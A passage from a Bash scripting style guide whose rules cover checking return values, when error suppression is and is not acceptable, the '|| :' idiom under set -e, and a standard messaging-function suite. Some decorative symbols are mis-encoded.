  return 0  # Success
}

# Check function return value
if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config file not found: $config_file" ;;
    5)  die 5 "Cannot read config file: $config_file" ;;
    22) die 22 "Config file is empty: $config_file" ;;
    *)  die 1 "Config validation failed: $config_file" ;;
  esac
fi
```

**Edge cases:**

**Pipelines:**

```bash
# Problem: set -e only checks last command
cat missing_file | grep pattern  # Continues if cat fails!

#  Solution 1: Use PIPEFAIL
set -o pipefail  # Pipeline fails if any command fails
cat missing_file | grep pattern  # Exits if cat fails

#  Solution 2: Check PIPESTATUS array
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then
  die 1 "cat failed"
elif ((PIPESTATUS[1] != 0)); then
  info "No matches found"
elif ((PIPESTATUS[2] != 0)); then
  die 1 "sort failed"
fi

#  Solution 3: Process substitution
grep pattern < <(cat file1)
```

**Command substitution:**

```bash
# Problem: Failure not caught
output=$(failing_command)  # Doesn't exit with set -e!

#  Solution 1: Check after assignment
output=$(command_that_might_fail) || die 1 "Command failed"

#  Solution 2: Explicit if check
if ! result=$(complex_command arg1 arg2); then
  die 1 "complex_command failed"
fi

#  Solution 3: inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit  # Command substitution inherits set -e
output=$(failing_command)  # NOW exits with set -e
```

**Conditional contexts:**

```bash
# Problem: Commands in if/while/until don't trigger set -e
if some_command; then
  echo "Command succeeded"
else
  echo "Command failed but script continues"
fi

#  Solution: Explicit check after conditional
if some_command; then
  process_result
else
  die 1 "some_command failed"
fi
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

info() {
  echo "[$SCRIPT_NAME] $*"
}

check_prerequisites() {
  local -- cmd
  local -a required_commands=('tar' 'gzip' 'sha256sum')

  info 'Checking prerequisites...'

  for cmd in "${required_commands[@]}"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  info 'Prerequisites check passed'
}

create_backup() {
  local -- source_dir="$1"
  local -- backup_file="$2"
  local -- temp_file
  local -i exit_code

  info "Creating backup: $source_dir -> $backup_file"

  # Check source exists
  if [[ ! -d "$source_dir" ]]; then
    error "Source directory not found: $source_dir"
    return 2
  fi

  # Check destination writable
  if [[ ! -w "${backup_file%/*}" ]]; then
    error "Cannot write to directory: ${backup_file%/*}"
    return 5
  fi

  # Create backup with error handling
  temp_file="${backup_file}.tmp"

  # Create tar archive
  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error "Failed to create tar archive"
    rm -f "$temp_file"
    return 1
  fi

  # Verify archive
  if ! tar -tzf "$temp_file" >/dev/null; then
    error "Backup verification failed"
    rm -f "$temp_file"
    return 1
  fi

  # Move to final location
  if ! mv "$temp_file" "$backup_file"; then
    error "Failed to move backup to final location"
    rm -f "$temp_file"
    return 1
  fi

  # Create checksum
  if ! sha256sum "$backup_file" > "${backup_file}.sha256"; then
    error "Failed to create checksum"
    # Non-fatal - backup is still valid
    return 0
  fi

  info "Backup created successfully: $backup_file"
  return 0
}

process_files() {
  local -a files=("$@")
  local -- file
  local -i success_count=0
  local -i fail_count=0

  for file in "${files[@]}"; do
    if create_backup "$file" "/backup/${file##*/}.tar.gz"; then
      ((success_count+=1))
      info "Success: $file"
    else
      ((fail_count+=1))
      error "Failed: $file (return code: $?)"
    fi
  done

  info "Results: $success_count successful, $fail_count failed"

  # Return non-zero if any failures
  ((fail_count == 0))
}

main() {
  check_prerequisites

  local -a source_dirs=('/etc' '/var/log')

  if ! process_files "${source_dirs[@]}"; then
    die 1 "Some backups failed"
  fi

  info "All backups completed successfully"
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
#  Wrong - ignoring return values
mv "$file" "$dest"
# No check! If mv fails, script continues

#  Correct
mv "$file" "$dest" || die 1 "Failed to move $file to $dest"

#  Wrong - checking $? too late
command1
command2
if (($? != 0)); then  # Checks command2, not command1!

#  Correct - check immediately
command1
if (($? != 0)); then
  die 1 "command1 failed"
fi
command2

#  Wrong - generic error message
mv "$file" "$dest" || die 1 "Move failed"

#  Correct - specific context
mv "$file" "$dest" || die 1 "Failed to move $file to $dest"

#  Wrong - not checking command substitution
checksum=$(sha256sum "$file")
# If sha256sum fails, checksum is empty but script continues!

#  Correct
checksum=$(sha256sum "$file") || die 1 "Failed to compute checksum for $file"

#  Wrong - not cleaning up after failure
cp "$source" "$dest" || exit 1
# Might leave partial file at $dest!

#  Correct - cleanup on failure
cp "$source" "$dest" || {
  rm -f "$dest"
  die 1 "Failed to copy $source to $dest"
}

#  Wrong - assuming set -e catches everything
set -e
output=$(failing_command)  # Doesn't exit!
cat missing_file | grep pattern  # Doesn't exit if cat fails!

#  Correct - explicit checks with set -e
set -euo pipefail
shopt -s inherit_errexit
output=$(failing_command) || die 1 "Command failed"
cat file | grep pattern  # Now exits if cat fails (pipefail)
```

**Summary:**

- Always check return values of critical operations
- Use `set -euo pipefail` as baseline, add explicit checks for control
- Provide context in error messages (what failed, with what inputs)
- Check command substitution: `output=$(cmd) || die 1 "cmd failed"`
- Use PIPEFAIL to catch pipeline failures
- Handle different exit codes appropriately (0=success, 1=error, 2=usage, etc.)
- Clean up on failure: `|| { cleanup; exit 1; }`

**Key principle:** Defensive programming assumes operations can fail. Check return values, provide informative errors, handle failures gracefully. Extra error checking prevents hours of debugging mysterious failures.


---


**Rule: BCS0805**

## Error Suppression

**Only suppress errors when failure is expected, non-critical, and explicitly safe to continue. Always document WHY. Indiscriminate suppression masks bugs and creates unreliable scripts.**

**Rationale:**

- Masks real bugs, hides failures that should be fixed
- Creates silent failuresscripts appear successful while actually failing
- Security riskignored errors leave systems in insecure states
- Debugging nightmaresuppressed errors impossible to diagnose
- False successusers think operations succeeded when they failed
- Technical debtsuppression often indicates design problems needing fixes

**When suppression IS appropriate:**

**1. Checking command/file existence (expected to fail):**

```bash
#  Appropriate - failure expected, non-critical
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
else
  info 'optional_tool not found (optional)'
fi

#  Testing existence
if [[ -f "$optional_config" ]]; then
  source "$optional_config"
else
  info "Using default configuration (no $optional_config)"
fi
```

**2. Cleanup operations (may have nothing to clean):**

```bash
#  Appropriate - cleanup may have nothing to do
cleanup_temp_files() {
  rm -f /tmp/myapp_* 2>/dev/null || true
  rmdir /tmp/myapp 2>/dev/null || true
}
```

**3. Optional operations with fallback:**

```bash
#  Appropriate - md2ansi optional, have fallback
if command -v md2ansi >/dev/null 2>&1; then
  md2ansi < "$file" || cat "$file"
else
  cat "$file"
fi
```

**4. Idempotent operations:**

```bash
#  Directory may already exist
install -d "$target_dir" 2>/dev/null || true

#  User may already exist
id "$username" >/dev/null 2>&1 || useradd "$username"
```

**When suppression is DANGEROUS:**

**1. File operations (usually critical):**

```bash
#  DANGEROUS - script continues with missing file!
cp "$important_config" "$destination" 2>/dev/null || true

#  Correct
if ! cp "$important_config" "$destination"; then
  die 1 "Failed to copy config to $destination"
fi
```

**2. Data processing (silently loses data):**

```bash
#  DANGEROUS - data lost if processing fails!
process_data < input.txt > output.txt 2>/dev/null || true

#  Correct
if ! process_data < input.txt > output.txt; then
  die 1 'Data processing failed'
fi
```

**3. System configuration (leaves system broken):**

```bash
#  DANGEROUS - service not running if fails!
systemctl start myapp 2>/dev/null || true

#  Correct
systemctl start myapp || die 1 'Failed to start myapp service'
```

**4. Security operations (creates vulnerabilities):**

```bash
#  DANGEROUS - file has wrong permissions if fails!
chmod 600 "$private_key" 2>/dev/null || true

#  Correct
chmod 600 "$private_key" || die 1 "Failed to secure $private_key"
```

**5. Dependency checks (script runs without required tools):**

```bash
#  DANGEROUS - later commands fail mysteriously!
command -v git >/dev/null 2>&1 || true

#  Correct - fail early
command -v git >/dev/null 2>&1 || die 1 'git is required'
```

**Error suppression patterns:**

**Pattern 1: Redirect stderr to /dev/null** (suppress messages only)

```bash
# Use when: Error messages noisy but you check return value
if ! command 2>/dev/null; then
  error "command failed"
fi
```

**Pattern 2: || true** (ignore return code)

```bash
# Use when: Failure acceptable, want to continue
rm -f /tmp/optional_file || true
```

**Pattern 3: Combined suppression** (both errors and return code)

```bash
# Use when: Both messages and return code irrelevant
rmdir /tmp/maybe_exists 2>/dev/null || true
```

**Pattern 4: Document WHY (ALWAYS add comment)**

```bash
# Suppress errors for optional cleanup
# Rationale: Temp files may not exist, not an error
rm -f /tmp/myapp_* 2>/dev/null || true

# Suppress errors for idempotent operation
# Rationale: Directory may exist from previous run
install -d "$cache_dir" 2>/dev/null || true
```

**Pattern 5: Conditional suppression**

```bash
if ((DRY_RUN)); then
  actual_operation 2>/dev/null || true  # Expected to fail in dry-run
else
  actual_operation || die 1 'Operation failed'  # Must succeed in real mode
fi
```

**Complete example with appropriate suppression:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -- CACHE_DIR="$HOME/.cache/myapp"
declare -- LOG_FILE="$HOME/.local/share/myapp/app.log"

check_optional_tools() {
  #  Safe to suppress - tool optional
  if command -v md2ansi >/dev/null 2>&1; then
    info 'md2ansi available for formatted output'
    declare -g -i HAS_MD2ANSI=1
  else
    info 'md2ansi not found (optional)'
    declare -g -i HAS_MD2ANSI=0
  fi
}

check_required_tools() {
  #  Do NOT suppress - tool required
  if ! command -v jq >/dev/null 2>&1; then
    die 1 'jq is required but not found'
  fi
  info 'Required tools found'
}

create_directories() {
  #  Safe to suppress - idempotent, directory may exist
  install -d "$CACHE_DIR" 2>/dev/null || true
  install -d "${LOG_FILE%/*}" 2>/dev/null || true

  # Verify they exist now
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create cache directory: $CACHE_DIR"
  [[ -d "${LOG_FILE%/*}" ]] || die 1 "Failed to create log directory: ${LOG_FILE%/*}"
}

cleanup_old_files() {
  info 'Cleaning up old files...'

  #  Safe to suppress - files may not exist, cleanup best-effort
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
  rm -f "$CACHE_DIR"/*.old 2>/dev/null || true

  #  Safe to suppress - rmdir only removes empty directories
  rmdir "$CACHE_DIR"/temp_* 2>/dev/null || true

  info 'Cleanup complete'
}

process_data() {
  local -- input_file="$1"
  local -- output_file="$2"

  #  Do NOT suppress - data processing errors critical
  if ! jq '.data' < "$input_file" > "$output_file"; then
    die 1 "Failed to process $input_file"
  fi

  #  Do NOT suppress - validation must succeed
  if ! jq empty < "$output_file"; then
    die 1 "Output file is invalid: $output_file"
  fi

  info "Processed: $input_file -> $output_file"
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files
  process_data 'input.json' "$CACHE_DIR/output.json"
  info 'Processing complete'
}

main "$@"

#fin
```

**Critical anti-patterns:**

```bash
#  WRONG - suppressing critical operation
cp "$important_file" "$backup" 2>/dev/null || true
# If cp fails, no backup but script continues!

#  Correct
cp "$important_file" "$backup" || die 1 "Failed to create backup"

#  WRONG - suppressing without understanding why
some_command 2>/dev/null || true

#  Correct - document reason
# Suppress errors: temp directory may not exist (non-critical)
rmdir /tmp/myapp 2>/dev/null || true

#  WRONG - suppressing all errors in function
process_files() {
  # ... many operations ...
} 2>/dev/null  # Suppresses ALL errors - extremely dangerous!

#  Correct - only suppress specific operations
process_files() {
  critical_operation || die 1 'Critical operation failed'
  optional_cleanup 2>/dev/null || true
}

#  WRONG - using set +e to suppress
set +e
critical_operation
set -e  # Disables error checking for entire block!

#  Correct - use || true for specific command
critical_operation || {
  error 'Operation failed but continuing'
  true  # Decided safe to ignore in this context
}
```

**Summary:**

- **Only suppress** when failure expected, non-critical, safe to ignore
- **Always document** WHY errors suppressed (comment above suppression)
- **Never suppress** critical operations (data, security, required dependencies)
- **Use `|| true`** to ignore return code while keeping stderr visible
- **Use `2>/dev/null`** to suppress error messages while checking return code
- **Use both** only when both messages and return code irrelevant
- **Verify after** suppressed operations when possible

**Key principle:** Error suppression should be exception, not rule. Every `2>/dev/null` and `|| true` is deliberate decision that this specific failure is safe to ignore. Document the decision with comment explaining why.


---


**Rule: BCS0806**

## Conditional Declarations with Exit Code Handling

**When using arithmetic conditionals for optional declarations or actions under `set -e`, append `|| :` to prevent false conditions from triggering script exit.**

**Rationale:**

- `(())` returns 0 (true) or 1 (false); under `set -e`, false conditions cause script exit
- Conditional execution `((condition)) && action` is intentional - action runs only if true
- `|| :` provides safe fallback - colon `:` is a no-op returning 0 (success)
- Traditional Unix idiom for "ignore this error"

**The problem:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

# âœ— DANGEROUS: Script exits here if complete=0!
((complete)) && declare -g BLUE=$'\033[0;34m'
# When complete=0: (( complete )) returns 1, && short-circuits,
# overall exit code is 1, set -e terminates script!

echo "This line never executes"
```

**The solution:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

# âœ“ SAFE: Script continues even when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m' || :
# When complete=0: (( complete )) returns 1, && short-circuits,
# || : triggers returning 0, script continues normally

echo "This line executes correctly"
```

**Why `:` (colon) over `true`:**

```bash
# âœ“ PREFERRED: Colon command
((condition)) && action || :
# Traditional Unix idiom, built-in, 1 character, POSIX standard

# âœ“ ACCEPTABLE: true command
((condition)) && action || true
# More explicit, 4 characters, also built-in, common in modern scripts

# Both correct; colon is traditional shell idiom
```

**Common patterns:**

**Pattern 1: Conditional variable declaration**

```bash
declare -i complete=0 verbose=0

# Declare extended variables only in complete mode
((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :

# Print variables only in verbose mode
((verbose)) && declare -p NC RED GREEN YELLOW || :
```

**Pattern 2: Nested conditional declarations**

```bash
if ((color)); then
  declare -g NC=$'\033[0m' RED=$'\033[0;31m'
  ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
else
  declare -g NC='' RED=''
  ((complete)) && declare -g BLUE='' MAGENTA='' || :
fi
```

**Pattern 3: Conditional block execution**

```bash
((verbose)) && {
  declare -p NC RED GREEN
  ((complete)) && declare -p BLUE MAGENTA || :
} || :
```

**Real-world example from color-set.sh:**

```bash
#!/bin/bash
# Dual-purpose script: sourceable library + executable demo

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0

  # Parse arguments to set flags
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose)  verbose=1 ;;
      always)   color=1 ;;
      never)    color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "$FUNCNAME: error: Invalid mode ${1@Q}"
                return 1 ;;
    esac
    shift
  done

  # Auto-detect if color not explicitly set
  ((color== -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; }

  # Declare flag variables only if flags mode active
  if ((flags)); then
    declare -ig VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -g NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m'
    ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' || :
  else
    declare -g NC='' RED='' GREEN=''
    ((complete)) && declare -g BLUE='' MAGENTA='' BOLD='' || :
  fi

  # Print variables only in verbose mode
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE || :
    declare -p NC RED GREEN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT || :
      declare -p BLUE MAGENTA BOLD
    } || :
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: only execute when run directly
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0
#!/bin/bash #semantic
set -euo pipefail

color_set "$@"

#fin
```

Demonstrates: two-tier system (basic vs complete), feature flags, multiple conditional declarations, safe handling under `set -e`.

**When to use this pattern:**

**âœ“ Use `|| :` when:**

1. **Optional variable declarations** based on feature flags
   ```bash
   ((DEBUG)) && declare -g DEBUG_OUTPUT=/tmp/debug.log || :
   ```

2. **Conditional exports** for environment variables
   ```bash
   ((PRODUCTION)) && export PATH=/opt/app/bin:$PATH || :
   ```

3. **Feature-gated actions** that should be silent when disabled
   ```bash
   ((VERBOSE)) && echo "Processing $file" || :
   ```

4. **Tier-based variable sets** (like basic vs complete colors)
   ```bash
   ((FULL_FEATURES)) && declare -g EXTRA_VAR=value || :
   ```

**âœ— Don't use when:**

1. **The action must succeed** - use explicit error handling
   ```bash
   # âœ— Wrong - suppresses critical errors
   ((required_flag)) && critical_operation || :

   # âœ“ Correct - check explicitly
   if ((required_flag)); then
     critical_operation || die 1 "Critical operation failed"
   fi
   ```

2. **You need to know if it failed** - capture the exit code
   ```bash
   # âœ— Wrong - hides failure
   ((condition)) && risky_operation || :

   # âœ“ Correct - handle failure
   if ((condition)) && ! risky_operation; then
     error "risky_operation failed"
     return 1
   fi
   ```

**Anti-patterns:**

```bash
# âœ— WRONG: No || :, script exits when condition is false
((complete)) && declare -g BLUE=$'\033[0;34m'

# âœ— WRONG: Double negative, less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# âœ— WRONG: Suppressing critical operations
((user_confirmed)) && delete_all_files || :
# If delete_all_files fails, error is hidden!

# âœ“ CORRECT: Check critical operations explicitly
if ((user_confirmed)); then
  delete_all_files || die 1 "Failed to delete files"
fi
```

**Comparison of alternatives:**

**Alternative 1: if statement (most explicit)**

```bash
# âœ“ Most readable, best for complex logic
if ((complete)); then
  declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m'
fi

# Pros: Crystal clear intent, no exit code issues
# Cons: More verbose (4 lines vs 1)
```

**Alternative 2: Arithmetic test with `|| :`**

```bash
# âœ“ Concise, safe under set -e
((complete)) && declare -g BLUE=$'\033[0;34m' || :

# Pros: One line, traditional idiom, safe
# Cons: Less obvious for beginners
```

**Alternative 3: Double-negative pattern**

```bash
# âœ“ Works but less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# Double negative is confusing - prefer positive logic with || :
```

**Summary:**

- Use `|| :` after `((condition)) && action` to prevent false conditions from triggering `set -e` exit
- Colon `:` is preferred over `true` (traditional shell idiom, concise)
- Only for optional operations - critical operations need explicit error handling
- Test both paths - verify behavior when condition is true and false
- Cross-reference: See BCS0705 (Arithmetic Operations), BCS0805 (Error Suppression), BCS0801 (Exit on Error)

**Key principle:** When you want conditional execution without risking script exit, use `((condition)) && action || :`. This makes your intent explicit: "Do this if condition is true, but don't exit if condition is false."


---


**Rule: BCS0900**

# Input/Output & Messaging

This section establishes standardized messaging patterns with color support and proper stream handling. Defines the complete messaging suite: `_msg()` (core function using FUNCNAME), `vecho()` (verbose), `success()`, `warn()`, `info()`, `debug()`, `error()` (unconditional to stderr), `die()` (exit with error), and `yn()` (yes/no prompts). Explains STDOUT vs STDERR separation (data vs diagnostics), usage documentation patterns, and when to use messaging functions versus bare echo. Error output must go to STDERR with `>&2` at command beginning.


---


**Rule: BCS0901**

## Standardized Messaging and Color Support
```bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```


---


**Rule: BCS0902**

## STDOUT vs STDERR

**Rules:**
- Error messages go to `STDERR`
- Place `>&2` at command beginning for clarity

**Examples:**

```bash
# Preferred format - redirect at beginning
somefunc() {
  >&2 echo "[$(date -Ins)]: $*"
}

# Also acceptable - redirect at end
somefunc() {
  echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
}
```


---


**Rule: BCS0903**

## Core Message Functions

**Every script should implement standard messaging functions using a private `_msg()` core function that detects the calling function via `FUNCNAME` to automatically format messages.**

**Rationale:**

- Consistency: Same message format across all scripts
- Context: `FUNCNAME` inspection automatically adds prefix/color
- DRY Principle: Single `_msg()` implementation reused by all messaging functions
- Verbosity Control: Conditional functions respect `VERBOSE` flag
- Proper Streams: Errors/warnings to stderr, regular output to stdout
- User Experience: Colors and symbols make output scannable

**Core pattern - `_msg()` inspects `FUNCNAME[1]` to determine formatting:**

```bash
# Private core messaging function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  # Detect calling function and set appropriate prefix/color
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}${NC}" ;;
    warn)    prefix+=" ${YELLOW}²${NC}" ;;
    info)    prefix+=" ${CYAN}É${NC}" ;;
    error)   prefix+=" ${RED}${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;  # Other callers get plain prefix
  esac

  # Print each message argument on separate line
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}
```

**Public wrapper functions:**

```bash
# Conditional output functions (respect VERBOSE flag)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output (respects DEBUG flag)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output (always shown)
error()   { >&2 _msg "$@"; }

# Error and exit
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}
```

**Usage:**

```bash
info 'Starting processing...'           # Only if VERBOSE=1
success "Installed to $PREFIX"          # Only if VERBOSE=1
warn 'Configuration file not found'     # Only if VERBOSE=1
error "Invalid file: $filename"         # Always shown
debug "Variable state: count=$count"    # Only if DEBUG=1
die 1 'Critical error occurred'         # Exit with message
die 1                                   # Exit without message
```

**Why stdout vs stderr matters:**

```bash
# info/warn/error go to stderr (>&2) - allows:
data=$(./script.sh)              # Gets only data, not info messages
./script.sh 2>errors.log         # Errors to file, data to stdout
./script.sh | process_data       # Messages visible, data piped
```

**Color definitions:**

```bash
# Conditional on terminal output
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'  # No Color (reset)
else
  RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC
```

**Flag variables:**

```bash
declare -i VERBOSE=0  # Set to 1 for info/warn/success messages
declare -i DEBUG=0    # Set to 1 for debug messages
declare -i PROMPT=1   # Set to 0 to disable prompts (for automation)
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0 DEBUG=0 PROMPT=1

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC

# Core message function using FUNCNAME
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}${NC}" ;;
    warn)    prefix+=" ${YELLOW}²${NC}" ;;
    info)    prefix+=" ${CYAN}É${NC}" ;;
    error)   prefix+=" ${RED}${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -d|--debug)   DEBUG=1 ;;
    -y|--yes)     PROMPT=0 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  readonly -- VERBOSE DEBUG PROMPT

  info "Starting $SCRIPT_NAME $VERSION"
  info 'Processing files...'
  success 'Files processed'

  if yn 'Continue with deployment?'; then
    success 'Deployment complete'
  else
    warn 'Deployment skipped'
  fi
}

main "$@"

#fin
```

**Variation: Log to file:**

```bash
LOG_FILE="/var/log/$SCRIPT_NAME.log"

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg timestamp

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}${NC}" ;;
    warn)    prefix+=" ${YELLOW}¡${NC}" ;;
    info)    prefix+=" ${CYAN}É${NC}" ;;
    error)   prefix+=" ${RED}${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s: %s\n' "$timestamp" "${FUNCNAME[1]^^}" "$msg" >> "$LOG_FILE"
  done
}
```

**Critical anti-patterns:**

```bash
#  Wrong - using echo directly (no stderr, prefix, color, or VERBOSE respect)
echo "Error: file not found"
#  Correct
error 'File not found'

#  Wrong - duplicating message logic
info()  { echo "[$SCRIPT_NAME] INFO: $*"; }
warn()  { echo "[$SCRIPT_NAME] WARN: $*"; }
error() { echo "[$SCRIPT_NAME] ERROR: $*"; }
#  Correct - use _msg core function (single implementation)
_msg() {
  local -- prefix="$SCRIPT_NAME:"
  case "${FUNCNAME[1]}" in
    info)  prefix+=" INFO:" ;;
    warn)  prefix+=" WARN:" ;;
    error) prefix+=" ERROR:" ;;
  esac
  echo "$prefix $*"
}
info()  { _msg "$@"; }
warn()  { _msg "$@"; }
error() { >&2 _msg "$@"; }

#  Wrong - errors to stdout
error() { echo "[ERROR] $*"; }
#  Correct - errors to stderr
error() { >&2 _msg "$@"; }

#  Wrong - ignoring VERBOSE flag (always prints)
info() { >&2 _msg "$@"; }
#  Correct
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

#  Wrong - die without exit code parameter
die() { error "$@"; exit 1; }
#  Correct
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}
```

**Function variants:**

**Minimal (no colors, no flags):**
```bash
info()  { >&2 echo "[$SCRIPT_NAME] $*"; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*"; }
die()   { error "$*"; exit "${1:-1}"; }
```

**Medium (with VERBOSE, no colors):**
```bash
declare -i VERBOSE=0
info()  { ((VERBOSE)) && >&2 echo "[$SCRIPT_NAME] $*"; return 0; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*"; }
die()   { local -i code=$1; shift; (($#)) && error "$@"; exit "$code"; }
```

**Key principles:**
- Use `_msg()` core with FUNCNAME inspection for DRY implementation
- Conditional functions respect VERBOSE; unconditional (error) always display
- Errors to stderr: `>&2` prefix on error/warn/info
- Colors conditional on terminal: `[[ -t 1 && -t 2 ]]`
- die() takes exit code first: `die 1 'Error message'`
- Consistent prefix: Every message shows script name
- Remove unused functions in production


---


**Rule: BCS0904**

## Usage Documentation
```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}
```


---


**Rule: BCS0905**

## Echo vs Messaging Functions

**Use messaging functions (`info`, `success`, `warn`, `error`) for operational status to stderr; use plain `echo` for data output to stdout. This stream separation enables proper script composition, piping, and verbosity control.**

**Rationale:**

- **Stream Separation**: Messaging ’ stderr (user-facing status), `echo` ’ stdout (data/parseable)
- **Verbosity Control**: Messaging respects `VERBOSE` flag, `echo` always displays (critical for data)
- **Consistent Formatting**: Messaging provides uniform prefixes/colors, `echo` is plain/parseable
- **Script Composition**: Proper streams allow pipeline usage without mixing data and status
- **Parseability**: Plain `echo` is predictable for piping/capturing; messaging includes formatting

**Use messaging functions for:**

